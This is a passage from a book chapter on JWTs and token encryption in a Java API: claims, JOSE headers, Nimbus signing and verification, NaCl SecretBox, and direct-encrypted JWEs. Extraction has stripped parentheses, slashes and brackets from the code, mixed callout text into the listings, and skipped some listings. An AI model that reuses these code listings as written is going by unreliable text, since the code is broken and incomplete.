 set  of  JSON object properties defined to hold claims about a subject, known as a claims set. You’ve already seen two standard JWT claims, because you used them in the implementation of the JsonTokenStore:   The exp claim indicates the expiry time of a JWT in UNIX time, which is the  number of seconds since midnight on January 1, 1970 in UTC.   The sub claim identifies the subject of the token: the user. Other claims in the  token are generally making claims about this subject.  JWT defines a handful of other claims too, which are listed in table 6.1. To save space, each claim is represented with a three-letter JSON object property.  Table 6.1 Standard JWT claims  Claim  Name  iss  Issuer  aud  Audience  Purpose  Indicates who created the JWT. This is a single string and often the URI of the  authentication service.  Indicates who the JWT is for. An array of strings identifying the intended recip- ients of the JWT. If there is only a single value, then it can be a simple string  value rather than an array. The recipient of a JWT must check that its identi- fier appears in the audience; otherwise, it should reject the JWT. Typically, this  is a set of URIs for APIs where the token can be used.  iat  nbf  exp  sub  Issued-At  The UNIX time at which the JWT was created.  Not-Before  The JWT should be rejected if used before this time.  Expiry  Subject  The UNIX time at which the JWT expires and should be rejected by recipients.  The identity of the subject of the JWT. A string. Usually a username or other  unique identifier.  jti  JWT ID  A unique ID for the JWT, which can be used to detect replay.  Of these claims, only the issuer, issued-at, and subject claims express a positive state- ment.  The  remaining  fields  all  describe  constraints  on  how  the  token  can  be  used rather than making a claim. These constraints are intended to prevent certain kinds of attacks against security tokens, such as replay attacks in which a token sent by a genu- ine party to a service to gain access is captured by an attacker and later replayed so that the attacker can gain access. Setting a short expiry time can reduce the window of opportunity for such attacks, but not eliminate them. The JWT ID can be used to add a  unique  value  to  a  JWT,  which  the  recipient  can  then  remember  until  the  token expires  to  prevent  the  same  token  being  replayed.  Replay  attacks  are  largely  pre- vented by the use of TLS but can be important if you have to send a token over an insecure channel or as part of an authentication protocol.   188  CHAPTER 6 Self-contained tokens and JWTs  DEFINITION A replay attack occurs when an attacker captures a token sent by a legitimate party and later replays it on their own request.  The  issuer  and  audience  claims  can  be  used  to  prevent  a  different  form  of  replay attack, in which the captured token is replayed against a different API than the origi- nally intended recipient. If the attacker replays the token back to the original issuer, this is known as a reflection attack, and can be used to defeat some kinds of authentica- tion protocols if the recipient can be tricked into accepting their own authentication messages. By verifying that your API server is in the audience list, and that the token was issued by a trusted party, these attacks can be defeated.  6.2.2  The JOSE header Most of the flexibility of the JOSE and JWT standards is concentrated in the header, which is an additional JSON object that is included in the authentication tag and con- tains metadata about the JWT. For example, the following header indicates that the token is signed with HMAC-SHA-256 using a key with the given key ID:  {   "alg": "HS256",       "kid": "hmac-key-1"       }  The algorithm  The key identifier  Although  seemingly  innocuous,  the  JOSE  header  is  one  of  the  more  error-prone aspects of the specifications, which is why the code you have written so far does not generate a header, and I often recommend that they are stripped when possible to create  nonstandard  headless JWTs. This can be done by removing the header section produced  by  a  standard  JWT  library  before  sending  it  and  then  recreating  it  again before validating a received JWT. Many of the standard headers defined by JOSE can open your API to attacks if you are not careful, as described in this section.  DEFINITION A headless JWT is a JWT with the header removed. The recipient recreates the header from expected values. For simple use cases where you control the sender and recipient this can reduce the size and attack surface of using  JWTs  but  the  resulting  JWTs  are  nonstandard.  Where  headless  JWTs can’t be used, you should strictly validate all header values.  The tokens you produced in section 6.1.1 are effectively headless JWTs and adding a JOSE header to them  and including it in the HMAC calculation  would make them standards-compliant. From now on you’ll use a real JWT library, though, rather than writing your own. THE ALGORITHM HEADER The alg header identifies the JWS or JWE cryptographic algorithm that was used to authenticate or encrypt the contents. This is also the only mandatory header value. The purpose of this header is to enable cryptographic agility, allowing an API to change the algorithm that it uses while still processing tokens issued using the old algorithm.    JSON Web Tokens  189  DEFINITION Cryptographic agility is the ability to change the algorithm used for securing messages or tokens in case weaknesses are discovered in one algo- rithm or a more performant alternative is required.  Although this is a good idea, the design in JOSE is less than ideal because the recipi- ent must rely on the sender to tell them which algorithm to use to authenticate the message. This violates the principle that you should never trust a claim that you have not authenticated, and yet you cannot authenticate the JWT until you have processed this claim! This weakness was what allowed Tim McClean to confuse JWT libraries by changing the alg header.   A better solution is to store the algorithm as metadata associated with a key on the server. You can then change the algorithm when you change the key, a methodology I refer to as key-driven cryptographic agility. This is much safer than recording the algo- rithm in the message, because an attacker has no ability to change the keys stored on your server. The JSON Web Key  JWK  specification allows an algorithm to be associ- ated with a key, as shown in listing 6.2, using the alg attribute. JOSE defines standard names for many authentication and encryption algorithms and the standard name for HMAC-SHA256 that you’ll use in this example is HS256. A secret key used for HMAC or AES is known as an octet key in JWK, as the key is just a sequence of random bytes and octet is an alternative word for byte. The key type is indicated by the kty attribute in a JWK, with the value oct used for octet keys.  DEFINITION In key-driven cryptographic agility, the algorithm used to authenti- cate a token is stored as metadata with the key on the server rather than as a header on the token. To change the algorithm, you install a new key. This prevents  an  attacker  from  tricking  the  server  into  using  an  incompatible algorithm.  Listing 6.2 A JWK with algorithm claim  {      "kty": "oct",      "alg": "HS256",             "k": "9ITYj4mt-TLYT2b_vnAyCVurks1r2uzCLw7sOxg-75g"      }  The algorithm the key  is to be used for  The Base64-encoded  bytes of the key itself  The JWE specification also includes an enc header that specifies the cipher used to encrypt the JSON body. This header is less error-prone than the alg header, but you should still validate that it contains a sensible value. Encrypted JWTs are discussed in section 6.3.3. SPECIFYING THE KEY IN THE HEADER To allow implementations to periodically change the key that they use to authenticate JWTs, in a process known as key rotation, the JOSE specifications include several ways to indicate which key was used. This allows the recipient to quickly find the right key to verify the token, without having to try each key in turn. The JOSE specs include one   190  CHAPTER 6 Self-contained tokens and JWTs  safe way to do this  the kid header  and two potentially dangerous alternatives listed in table 6.2.   DEFINITION Key rotation is the process of periodically changing the keys used to protect messages and tokens. Changing the key regularly ensures that the usage limits for a key are never reached and if any one key is compromised then it is soon replaced, limiting the time in which damage can be done.  Table 6.2 Indicating the key in a JOSE header  Header  Contents  Safe?  Comments  kid  A key ID  Yes  As the key ID is just a string identifier, it can be safely looked up in a  server-side set of keys.  jwk  The full key  No  Trusting the sender to give you the key to verify a message loses all  security properties.  jku  No  An URL to  retrieve the  full key  The intention of this header is that the recipient can retrieve the key  from a HTTPS endpoint, rather than including it directly in the mes- sage, to save space. Unfortunately, this has all the issues of the  jwk header, but additionally opens the recipient up to SSRF attacks.  DEFINITION A server-side request forgery  SSRF  attack occurs when an attacker can  cause  a server to make  outgoing network requests under the attacker’s control.  Because  the  server  is  on  a  trusted  network  behind  a  firewall,  this allows the attacker to probe and potentially attack machines on the internal network that they could not otherwise access. You’ll learn more about SSRF attacks and how to prevent them in chapter 10.  There are also headers for specifying the key as an X.509 certificate  used in TLS . Pars- ing and validating X.509 certificates is very complex so you should avoid these headers.  Now that you’ve seen the basic idea of how a JWT is constructed, you’ll switch to using a real JWT library for generating JWTs for the rest of the chapter. It’s always better to use a well-tested library for security when one is available. There are many JWT and JOSE libraries for most programming languages, and the https:  jwt.io website main- tains a list. You should check that the library is actively maintained and that the devel- opers are aware of historical JWT vulnerabilities such as the ones mentioned in this chapter. For this chapter, you can use Nimbus JOSE + JWT from https:  connect2id .com products nimbus-jose-jwt,  which  is  a  well-maintained  open  source   Apache  2.0 licensed  Java JOSE library. Open the pom.xml file in the Natter project root folder and add the following dependency to the dependencies section to load the Nimbus library:               com.nimbusds         nimbus-jose-jwt   6.2.3 Generating standard JWTs   JSON Web Tokens  191         8.19         Listing 6.3 shows how to use the library to generate a signed JWT. The code is generic and can be used with any JWS algorithm, but for now you’ll use the HS256 algorithm, which  uses  HMAC-SHA-256,  just  like  the  existing  HmacTokenStore.  The  Nimbus library requires a JWSSigner object for generating signatures, and a JWSVerifier for verifying them. These objects can often be used with several algorithms, so you should also pass in the specific algorithm to use as a separate JWSAlgorithm object. Finally, you should also pass in a value to use as the audience for the generated JWTs. This should usually be the base URI of the API server, such as https:   localhost:4567. By setting and verifying the audience claim, you ensure that a JWT can’t be used to access a different API, even if they happen to use the same cryptographic key. To produce the JWT you first build the claims set, set the sub claim to the username, the exp claim to the token expiry time, and the aud claim to the audience value you got from the constructor.  You  can  then  set  any  other  attributes  of  the  token  as  a  custom  claim, which will become a nested JSON object in the claims set. To sign the JWT you then set the correct algorithm in the header and use the JWSSigner object to calculate the signature. The serialize   method will then produce the JWS Compact Serialization of the JWT to return as the token identifier.

Sign the JWT using the JWSSigner object.  Create the JWT  claims set with  details about  the token.  Specify the algorithm  in the header and  build the JWT.      @Override     public Optional  read Request request, String tokenId  {            TODO         return Optional.empty  ;     }      @Override     public void revoke Request request, String tokenId  {            TODO     } }  To use the new token store, open the Main.java  file in  your editor and change  the code that constructs the JsonTokenStore and HmacTokenStore to instead construct a SignedJwtTokenStore. You can reuse the same macKey that you loaded for the Hmac- TokenStore,  as  you’re  using  the  same  algorithm  for  signing  the  JWTs.  The  code should look like the following, using the MACSigner and MACVerifier classes for sign- ing and verification using HMAC:  var algorithm = JWSAlgorithm.HS256;                    var signer = new MACSigner  SecretKey  macKey ;        var verifier = new MACVerifier  SecretKey  macKey ;    TokenStore tokenStore = new SignedJwtTokenStore                           signer, verifier, algorithm, "https:  localhost:4567" ;   var tokenController = new TokenController tokenStore ;  Construct the MACSigner  and MACVerifier objects  with the macKey.  Pass the signer, verifier, algorithm, and audience to the SignedJwtTokenStore.  You can now restart the API server, create a test user, and log in to see the created JWT:  $ curl -H 'Content-Type: application json' \   -d '{"username":"test","password":"password"}' \   https:  localhost:4567 users {"username":"test"}   JSON Web Tokens  193  $ curl -H 'Content-Type: application json' -u test:password \   -d '' https:  localhost:4567 sessions {"token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiaHR0cH ➥ M6XC9cL2xvY2FsaG9zdDo0NTY3IiwiZXhwIjoxNTc3MDA3ODcyLCJhdHRycyI ➥ 6e319.nMxLeSG6pmrPOhRSNKF4v31eQZ3uxaPVyj-Ztf-vZQw"}  You can take this JWT and paste it into the debugger at https:  jwt.io to validate it and see the contents of the header and claims, as shown in figure 6.3.

WARNING While  jwt.io  is  a  great  debugging  tool,  remember  that  JWTs  are credentials so  you  should never post JWTs  from a  production  environment into any website.  6.2.4  Validating a signed JWT To validate a JWT, you first parse the JWS Compact Serialization format and then use the JWSVerifier object to verify the signature. The Nimbus MACVerifier will calcu- late the correct HMAC tag and then compare it to the tag attached to the JWT using a constant-time equality comparison, just like you did in the HmacTokenStore. The Nim- bus library also takes care of basic security checks, such as making sure that the algo- rithm header is compatible with the verifier  preventing the algorithm mix up attacks   194  CHAPTER 6 Self-contained tokens and JWTs  discussed in section 6.2 , and that there are no unrecognized critical headers. After the signature has been verified, you can extract the JWT claims set and verify any con- straints. In this case, you just need to check that the expected audience value appears in the audience claim, and then set the token expiry from the JWT expiry time claim. The TokenController will ensure that the token hasn’t expired. Listing 6.4 shows the full  JWT  validation  logic.  Open  the  SignedJwtTokenStore.java  file  and  replace  the read   method with the contents of the listing.  Listing 6.4 Validating a signed JWT      @Override     public Optional  read Request request, String tokenId  {         try {             var jwt = SignedJWT.parse tokenId ;                                            if  !jwt.verify verifier   {                                         throw new JOSEException "Invalid signature" ;                }                                                     Parse the JWT and  verify the HMAC  signature using the  JWSVerifier.  Reject the token if the audience doesn’t contain your API’s base URI.              var claims = jwt.getJWTClaimsSet  ;             if  !claims.getAudience  .contains audience   {                       throw new JOSEException "Incorrect audience" ;                }                                                                  var expiry = claims.getExpirationTime  .toInstant  ;    Extract token             var subject = claims.getSubject  ;                      attributes from             var token = new Token expiry, subject ;                 the remaining             var attrs = claims.getJSONObjectClaim "attrs" ;         JWT claims.             attrs.forEach  key, value  ->                                               token.attributes.put key,  String  value  ;                  return Optional.of token ;         } catch  ParseException  JOSEException e  {             return Optional.empty  ;             }     }  If the token is invalid,  then return a generic  failure response.

The answers are at the end of the chapter.  Encrypting sensitive attributes A database in your datacenter, protected by firewalls and physical access controls, is a relatively safe place to store token data, especially if you follow the hardening advice in the last chapter. Once you move away from a database and start storing data on the client,  that  data  is  much  more  vulnerable  to  snooping.  Any  personal  information about the user included in the token, such as name, date of birth, job role, work loca- tion, and so on, may be at risk if the token is accidentally leaked by the client or stolen though  a  phishing  attack  or  XSS  exfiltration.  Some  attributes  may  also  need  to  be kept confidential from the user themselves, such as any attributes that reveal details of the API implementation. In chapter 7, you’ll also consider third-party client applica- tions that may not be trusted to know details about who the user is.   Encryption is a complex topic with many potential pitfalls, but it can be used suc- cessfully if you stick to well-studied algorithms and follow some basic rules. The goal of encryption is to ensure the confidentiality of a message by converting it into an obscured form, known as the ciphertext, using a secret key. The algorithm is known as a cipher. The recipient can then use the same secret key to recover the original plain- text message. When the sender and recipient both use the same key, this is known as secret  key  cryptography.  There  are  also  public  key  encryption  algorithms  in  which  the sender and recipient have different keys, but we won’t cover those in much detail in this book.   An important principle of cryptography, known as Kerckhoff’s Principle, says that an encryption scheme should be secure even if every aspect of the algorithm is known, so long as the key remains secret.   NOTE You should use only algorithms that have been designed through an open process with public review by experts, such as the algorithms you’ll use in this chapter.   196  CHAPTER 6 Self-contained tokens and JWTs  There are several secure encryption algorithms in current use, but the most important is  the  Advanced  Encryption  Standard   AES ,  which  was  standardized  in  2001  after  an international competition, and is widely considered to be very secure. AES is an exam- ple of a block cipher, which takes a fixed size input of 16 bytes and produces a 16-byte encrypted output. AES keys are either 128 bits, 192 bits, or 256 bits in size. To encrypt more  or less  than 16 bytes with AES, you use a block cipher mode of operation. The choice of mode of operation is crucial to the security as demonstrated in figure 6.4, which shows an image of a penguin encrypted with the same AES key but with two dif- ferent  modes  of  operation.1  The  Electronic  Code  Book   ECB   mode  is  completely insecure and leaks a lot of details about the image, while the more secure Counter Mode  CTR  eliminates any details and looks like random noise.  Original image  Encrypted with AES-ECB  Encrypted with AES-CTR  Figure 6.4 An image of the Linux mascot, Tux, that has been encrypted by AES  in ECB mode. The shape of the penguin and many features are still visible despite  the encryption. By contrast, the same image encrypted with AES in CTR mode is  indistinguishable from random noise.

The  AES  block  cipher  operates  on  16-byte  blocks.  A  block cipher mode of operation allows a fixed-sized block cipher to be used to encrypt messages of any length. The mode of operation is critical to the security of the encryption process.  1 This is a very famous example known as the ECB Penguin. You’ll find the same example in many introductory  cryptography books.   6.3.1  Encrypting sensitive attributes  197  Authenticated encryption Many  encryption  algorithms  only  ensure  the  confidentiality  of  data  that  has  been encrypted and don’t claim to protect the integrity of that data. This means that an attacker won’t be able to read any sensitive attributes in an encrypted token, but they may be able to alter them. For example, if you know that a token is encrypted with CTR mode and  when decrypted  starts with the string user=brian, you can change this to read  user=admin by simple manipulation of the ciphertext even though you can’t decrypt the token. Although there isn’t room to go into the details here, this kind of attack is often covered in cryptography tutorials under the name chosen cipher- text attack.  DEFINITION A chosen ciphertext attack is an attack against an encryption scheme in which an attacker manipulates the encrypted ciphertext.  In terms of threat models from chapter 1, encryption protects against information dis- closure threats, but not against spoofing or tampering. In some cases, confidentiality can also be lost if there is no guarantee of integrity because an attacker can alter a message and then see what error message is generated when the API tries to decrypt it. This often leaks information about what the message decrypted to.  LEARN MORE You can learn more about how modern encryption algorithms work, and attacks against them, from an up-to-date introduction to cryptogra- phy book such as Serious Cryptography by Jean-Philippe Aumasson  No Starch Press, 2018 .  To protect against spoofing and tampering threats, you should always use algorithms that provide authenticated encryption. Authenticated encryption algorithms combine an encryption algorithm for hiding sensitive data with a MAC algorithm, such as HMAC, to ensure that the data can’t be altered or faked.  DEFINITION Authenticated encryption combines an encryption algorithm with a  MAC.  Authenticated  encryption  ensures  confidentiality  and  integrity  of messages.  One way to do this would be to combine a secure encryption scheme like AES in CTR mode  with  HMAC.  For  example,  you  might  make  an  EncryptedTokenStore  that encrypts data using AES and then combine that with the existing HmacTokenStore for authentication.  But  there  are  two  ways  you  could  combine  these  two  stores:  first encrypting and then applying HMAC, or, first applying HMAC and then encrypting the token and the tag together. It turns out that only the former is generally secure and is known as Encrypt-then-MAC  EtM . Because it is easy to get this wrong, cryptog- raphers  have  developed  several  dedicated  authenticated  encryption  modes,  such  as Galois Counter Mode  GCM  for AES. JOSE supports both GCM and EtM encryption modes, which you’ll examine in section 6.3.3, but we’ll begin by looking at a simpler alternative.   198  6.3.2  CHAPTER 6 Self-contained tokens and JWTs  Authenticated encryption with NaCl Because cryptography is complex with many subtle details to get right, a recent trend has  been  for  cryptography  libraries  to  provide  higher-level  APIs  that  hide  many  of these details from developers. The most well-known of these is the Networking and Cryptography Library  NaCl; https:  nacl.cr.yp.to  designed by Daniel Bernstein. NaCl  pronounced “salt,” as in sodium chloride  provides high-level operations for authen- ticated  encryption,  digital  signatures,  and  other  cryptographic  primitives  but  hides many of the details of the algorithms being used. Using a high-level library designed by experts such as NaCl is the safest option when implementing cryptographic protec- tions for your APIs and can be significantly easier to use securely than alternatives.  TIP Other  cryptographic  libraries  designed  to  be  hard  to  misuse  include Google’s Tink  https:  github.com google tink  and Themis from Cossack Labs  https:  github.com cossacklabs themis . The Sodium library  https:   libsodium.org  is a widely used clone of NaCl in C that provides many additional extensions and a simplified API with bindings for Java and other languages.  In  this  section,  you’ll  use  a  pure  Java  implementation  of  NaCl  called  Salty  Coffee  https:  github.com NeilMadden salty-coffee ,  which  provides  a  very  simple  and Java-friendly API with acceptable performance.2 To add the library to the Natter API project, open the pom.xml file in the root folder of the Natter API project and add the following lines to the dependencies section:               software.pando.crypto         salty-coffee         1.0.2         Listing 6.5 shows an EncryptedTokenStore implemented using the Salty Coffee library’s SecretBox  class,  which  provides  authenticated  encryption.  Like  the  HmacTokenStore, you  can  delegate  creating  the  token  to  another  store,  allowing  this  to  be  wrapped around  the  JsonTokenStore  or  another  format.  Encryption  is then  performed  with the  SecretBox.encrypt   method. This method returns a  SecretBox object, which has  methods  for  getting  the  encrypted  ciphertext  and  the  authentication  tag.  The toString   method encodes these components into a URL-safe string that you can use directly  as  the  token  ID.  To  decrypt  the  token,  you  can  use  the  SecretBox.from- String   method to recover the SecretBox from the encoded string, and then use the decryptToString   method to decrypt it and get back the original token ID. Navigate to  the  src main java com manning apisecurityinaction token  folder  again  and  cre- ate a new file named EncryptedTokenStore.java with the contents of listing 6.5.     2  I wrote Salty Coffee, reusing cryptographic code from Google's Tink library, to provide a simple pure Java solution. Bindings to libsodium are generally faster if you can use a native library.   Encrypting sensitive attributes  199  Listing 6.5 An EncryptedTokenStore  package com.manning.apisecurityinaction.token;  import java.security.Key; import java.util.Optional;  import software.pando.crypto.nacl.SecretBox; import spark.Request;  public class EncryptedTokenStore implements TokenStore {      private final TokenStore delegate;     private final Key encryptionKey;  Decode and decrypt the box and then use the original token ID.      public EncryptedTokenStore TokenStore delegate, Key encryptionKey  {         this.delegate = delegate;         this.encryptionKey = encryptionKey;     }      @Override     public String create Request request, Token token  {         var tokenId = delegate.create request, token ;            return SecretBox.encrypt encryptionKey, tokenId .toString  ;         }  Call the delegate  TokenStore to  generate the  token ID.  Use the SecretBox.encrypt   method to encrypt the token.      @Override     public Optional  read Request request, String tokenId  {         var box = SecretBox.fromString tokenId ;                             var originalTokenId = box.decryptToString encryptionKey ;            return delegate.read request, originalTokenId ;                  }      @Override     public void revoke Request request, String tokenId  {         var box = SecretBox.fromString tokenId ;                             var originalTokenId = box.decryptToString encryptionKey ;            delegate.revoke request, originalTokenId ;                       } }  As you can see, the EncryptedTokenStore using SecretBox is very short because the library takes care of almost all details for you. To use the new store, you’ll need to gen- erate a new key to use for encryption rather than reusing the existing HMAC key.  PRINCIPLE A cryptographic key should only be used for a single purpose. Use separate keys for different functionality or algorithms.  Because Java’s keytool command doesn’t support generating keys for the encryption algorithm that SecretBox uses, you can instead generate a standard AES key and then convert it as the two key formats are identical. SecretBox only supports 256-bit keys,   200  CHAPTER 6 Self-contained tokens and JWTs  so run the following command in the root folder of the Natter API project to add a new AES key to the existing keystore:  keytool -genseckey -keyalg AES -keysize 256 \     -alias aes-key -keystore keystore.p12 -storepass changeit  You can then load the new key in the Main class just as you did for the HMAC key in chapter 5. Open Main.java in your editor and locate the lines that load the HMAC key from the keystore and add a new line to load the AES key:  var macKey = keyStore.getKey "hmac-key", keyPassword ;     var encKey = keyStore.getKey "aes-key", keyPassword ;     The existing HMAC key  The new AES key  You can convert the key into the correct format with the SecretBox.key   method, passing in the raw key bytes, which you can get by calling encKey.getEncoded  . Open the Main.java file again and update the code that constructs the  TokenController to convert the key and use it to create an EncryptedTokenStore, wrapping a JsonToken- Store, instead of the previous JWT-based implementation:      var naclKey = SecretBox.key encKey.getEncoded   ;        var tokenStore = new EncryptedTokenStore                               new JsonTokenStore  , naclKey ;                var tokenController = new TokenController tokenStore ;  Convert the key to  the correct format.  Construct the  EncryptedToken- Store wrapping a  JsonTokenStore.  You can now restart the API and login again to get a new encrypted token.  6.3.3  Encrypted JWTs  NaCl’s SecretBox is hard to beat for simplicity and security, but there is no standard for how encrypted tokens are formatted into strings and different libraries may use different  formats  or  leave  this  up  to  the  application.  This  is  not  a  problem  when tokens are only consumed by the same API that generated them but can become an issue if tokens are shared between many APIs, developed by separate teams in differ- ent programming languages. A standard format such as JOSE becomes more compel- ling in these cases. JOSE supports several authenticated encryption algorithms in the JSON Web Encryption  JWE  standard.    An encrypted JWT using the JWE Compact Serialization looks superficially like the HMAC JWTs from section 6.2, but there are more components reflecting the more complex structure of an encrypted token, shown in figure 6.5. The five components of a JWE are:  1 The  JWE  header,  which  is  very  like  the  JWS  header,  but  with  two  additional fields: enc, which specifies the encryption algorithm, and zip, which specifies an optional compression algorithm to be applied before encryption.

Each component is URL-safe Base64- encoded. Values have been truncated for display.  2 An optional encrypted key. This is used in some of the more complex encryp- tion algorithms. It is empty for the direct symmetric encryption algorithm that is covered in this chapter.  3 The initialization vector or nonce used when encrypting the payload. Depending on the encryption method being used, this will be either a 12- or 16-byte ran- dom binary value that has been Base64url-encoded.  4 The encrypted ciphertext. 5 The MAC authentication tag.  DEFINITION An  initialization  vector   IV   or  nonce   number-used-once   is  a unique value that is provided to the cipher to ensure that ciphertext is always different  even  if  the  same  message  is  encrypted  more  than  once.  The  IV should  be  generated  using  a  java.security.SecureRandom  or  other  cryp- tographically-secure  pseudorandom  number  generator   CSPRNG .3  An  IV doesn’t need to be kept secret.  JWE divides specification of the encryption algorithm into two parts:   The  enc  header  describes  the  authenticated  encryption  algorithm  used  to   The alg header describes how the sender and recipient agree on the key used  encrypt the payload of the JWE.  to encrypt the content.  There are a wide variety of key management algorithms for JWE, but for this chapter you will stick to direct encryption with a secret key. For direct encryption, the algo- rithm  header  is  set  to  dir   direct .  There  are  currently  two  available  families  of encryption methods in JOSE, both of which provide authenticated encryption:  A128GCM, A192GCM, and A256GCM use AES in Galois Counter Mode  GCM .  A128CBC-HS256,  A192CBC-HS384,  and  A256CBC-HS512  use  AES  in  Cipher  Block Chaining  CBC  mode together with either HMAC in an EtM configuration as described in section 6.3.1.   3 A nonce only needs to be unique and could be a simple counter. However, synchronizing a counter across  many servers is difficult and error-prone so it’s best to always use a random value.   202  CHAPTER 6 Self-contained tokens and JWTs  DEFINITION All the encryption algorithms allow the JWE header and IV to be included in the authentication tag without being encrypted. These are known as authenticated encryption with associated data  AEAD  algorithms.  GCM was designed for use in protocols like TLS where a unique session key is negoti- ated for each session and a simple counter can be used for the nonce. If you reuse a nonce with GCM then almost all security is lost: an attacker can recover the MAC key and  use  it to forge tokens, which is catastrophic for authentication tokens. For this reason,  I  prefer to  use  CBC  with  HMAC  for  directly  encrypted  JWTs,  but  for  other JWE algorithms GCM is an excellent choice and very fast.   CBC requires the input to be padded to a multiple of the AES block size  16 bytes , and  this  historically  has  led  to  a  devastating  vulnerability  known  as  a padding  oracle attack, which allows an attacker to recover the full plaintext just by observing the dif- ferent error messages when an API tries to decrypt a token they have tampered with. The use of HMAC in JOSE prevents this kind of tampering and largely eliminates the possibility of padding oracle attacks, and the padding has some security benefits.  WARNING You should avoid revealing the reason why decryption failed to the callers of your API to prevent oracle attacks like the CBC padding oracle attack.  What key size should you use? AES allows keys to be in one of three different sizes: 128-bit, 192-bit, or 256-bit. In principle, correctly guessing a 128-bit key is well beyond the capability of even an attacker with enormous amounts of computing power. Trying every possible value of a key is known as a brute-force attack and should be impossible for a key of that size. There are three exceptions in which that assumption might prove to be wrong:   A weakness in the encryption algorithm might be discovered that reduces the amount of effort required to crack the key. Increasing the size of the key pro- vides a security margin against such a possibility.   New  types  of  computers  might  be  developed  that  can  perform  brute-force searches much quicker than existing computers. This is believed to be true of quantum  computers,  but  it’s  not  known  whether  it  will  ever  be  possible  to build a large enough quantum computer for this to be a real threat. Doubling the  size  of  the  key  protects  against  known  quantum  attacks  for  symmetric algorithms like AES.   Theoretically, if each user has their own encryption key and you have millions of users, it may be possible to attack every key simultaneously for less effort than you would expect from naively trying to break them one at a time. This is known  as  a  batch  attack  and  is  described  further  in  https:  blog.cr.yp.to  20151120-batchattacks.html.  At the time of writing, none of these attacks are practical for AES, and for short-lived authentication tokens the risk is significantly less, so 128-bit keys are perfectly safe. On the  other  hand,  modern CPUs have  special  instructions  for  AES  encryption so there’s very little extra cost for 256-bit keys if you want to eliminate any doubt.   Encrypting sensitive attributes  203  Remember that the JWE CBC with HMAC methods take a key that is twice the size as normal. For example, the A128CBC-HS256 method requires a 256-bit key, but this is really two 128-bit keys joined together rather than a true 256-bit key.  6.3.4 Using a JWT library  Due  to  the  relative  complexity  of  producing  and  consuming  encrypted  JWTs  com- pared  to  HMAC,  you’ll  continue  using  the  Nimbus  JWT  library  in  this  section. Encrypting a JWT with Nimbus requires a few steps, as shown in listing 6.6.    First you build a JWT claims set using the convenient JWTClaimsSet.Builder class.   You can then create a JWEHeader object to specify the algorithm and encryption   Finally,  you  encrypt  the  JWT  using  a  DirectEncrypter  object  initialized  with  method.   the AES key.   The serialize   method on the EncryptedJWT object will then return the JWE Com- pact Serialization. Navigate to src main java com manning apisecurityinaction token and create a new file name EncryptedJwtTokenStore.java. Type in the contents of list- ing 6.6 to create the new token store and save the file. As for the JsonTokenStore, leave the revoke method blank for now. You’ll fix that in section 6.6.  Listing 6.6 The EncryptedJwtTokenStore  package com.manning.apisecurityinaction.token;  import com.nimbusds.jose.*; import com.nimbusds.jose.crypto.*; import com.nimbusds.jwt.*; import spark.Request;  import javax.crypto.SecretKey; import java.text.ParseException; import java.util.*;  public class EncryptedJwtTokenStore implements TokenStore {      private final SecretKey encKey;      public EncryptedJwtTokenStore SecretKey encKey  {         this.encKey = encKey;     }      @Override     public String create Request request, Token token  {         var claimsBuilder = new JWTClaimsSet.Builder                         .subject token.username                                      .audience "https:  localhost:4567"                           .expirationTime Date.from token.expiry  ;            token.attributes.forEach claimsBuilder::claim ;       Build the JWT  claims set.   204  CHAPTER 6 Self-contained tokens and JWTs  Create the JWE header and assemble the header and claims.          var header = new JWEHeader JWEAlgorithm.DIR,                                EncryptionMethod.A128CBC_HS256 ;                            var jwt = new EncryptedJWT header, claimsBuilder.build   ;           try {             var encrypter = new DirectEncrypter encKey ;                  jwt.encrypt encrypter ;                                   } catch  JOSEException e  {             throw new RuntimeException e ;         }  Encrypt the  JWT using the  AES key in direct  encryption mode.          return jwt.serialize  ;          }  Return the Compact  Serialization of the  encrypted JWT.      @Override     public void revoke Request request, String tokenId  {     } }  Processing an encrypted JWT using the library is just as simple as creating one. First, you parse the encrypted JWT and then decrypt it using a DirectDecrypter initialized with  the  AES  key,  as  shown  in  listing  6.7.  If  the  authentication  tag  validation  fails during  decryption,  then  the  library  will  throw  an  exception.  To  further  reduce  the possibility of padding oracle attacks in CBC mode, you should never return any details about why decryption failed to the user, so just return an empty Optional here as if no token had been supplied. You can log the exception details to a debug log that is only accessible to system administrators if you wish. Once the JWT has been decrypted, you can extract and validate the claims from the JWT. Open EncryptedJwtTokenStore.java in your editor again and implement the read method as in listing 6.7.  Listing 6.7 The JWT read method  @Override public Optional  read Request request, String tokenId  {     try {         var jwt = EncryptedJWT.parse tokenId ;               var decryptor = new DirectDecrypter encKey ;             jwt.decrypt decryptor ;                           Parse the encrypted JWT.  Decrypt and  authenticate  the JWT using the  DirectDecrypter.          var claims = jwt.getJWTClaimsSet  ;         if  !claims.getAudience  .contains "https:  localhost:4567"   {             return Optional.empty  ;         }         var expiry = claims.getExpirationTime  .toInstant  ;                   var subject = claims.getSubject  ;                                     var token = new Token expiry, subject ;                                var ignore = Set.of "exp", "sub", "aud" ;                              for  var attr : claims.getClaims  .keySet    {                             if  ignore.contains attr   continue;                                   token.attributes.put attr, claims.getStringClaim attr  ;           }  Extract any claims from the JWT.

You  can  now  update  the  main  method  to  switch  to  using  the  EncryptedJwtToken- Store, replacing the previous EncryptedTokenStore. You can reuse the AES key that you  generated  in  section  6.3.2,  but  you’ll  need  to  cast  it  to  the  more  specific javax.crypto.SecretKey class that the Nimbus library expects. Open Main.java and update the code to create the token controller again:  TokenStore tokenStore = new EncryptedJwtTokenStore       SecretKey  encKey ;                               var tokenController = new TokenController tokenStore ;  Cast the key to the more  specific SecretKey class.  Restart the API and try it out:  $ curl -H 'Content-Type: application json' \   -u test:password -X POST https:  localhost:4567 sessions {"token":"eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0..hAOoOsgfGb8yuhJD ➥ .kzhuXMMGunteKXz12aBSnqVfqtlnvvzqInLqp83zBwUW_rqWoQp5wM_q2D7vQxpK ➥ TaQR4Nuc-D3cPcYt7MXAJQ.ZigZZclJPDNMlP5GM1oXwQ"}  Compressed tokens The encrypted JWT is a bit larger than either a simple HMAC token or the NaCl tokens from section 6.3.2. JWE supports optional compression of the JWT Claims Set before encryption, which can significantly reduce the size for complex tokens. But combining encryption and compression can lead to security weaknesses. Most encryption algo- rithms do not hide the length of the plaintext message that was encrypted, and com- pression reduces the size of a message based on its content. For example, if two parts of a message are identical, then it may combine them to remove the duplica- tion. If an attacker can influence part of a message, they may be able to guess the rest of the contents by seeing how much it compresses. The CRIME and BREACH attacks  http:  breachattack.com  against 